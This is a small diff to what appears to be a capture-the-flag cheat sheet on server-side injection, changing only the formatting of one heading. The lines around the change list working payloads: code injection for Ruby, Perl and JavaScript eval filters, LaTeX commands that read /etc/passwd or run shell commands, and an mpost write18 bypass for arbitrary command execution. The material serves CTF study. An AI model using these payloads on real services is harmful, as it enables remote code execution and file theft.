@@ -233,7 +233,7 @@ See [server-side.md](server-side.md#php-file-inclusion--phpfilter) for filter ch
 
 **Ruby `instance_eval`:** Break string + comment: `VALID');INJECTED_CODE#`
 **Perl `open()`:** 2-arg open allows pipe: `|command|`
-**JS `eval` blocklist bypass:** `row['con'+'structor']['con'+'structor']('return this')()`
+**JS eval blocklist bypass:** `row['con'+'structor']['con'+'structor']('return this')()`
 **PHP deserialization:** Craft serialized object in cookie → LFI/RCE
 **LaTeX injection:** `\input{|"cat /flag.txt"}` — shell command via pipe syntax in PDF generation services. `\@@input"/etc/passwd"` for file reads without shell.
 - **LaTeX restricted write18 bypass:** When `write18` is restricted, `mpost -ini "-tex=bash -c (cmd)" file.mp` uses mpost's whitelisted status to execute arbitrary commands. `${IFS}` replaces spaces. See [server-side-advanced-2.md](server-side-advanced-2.md#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016).
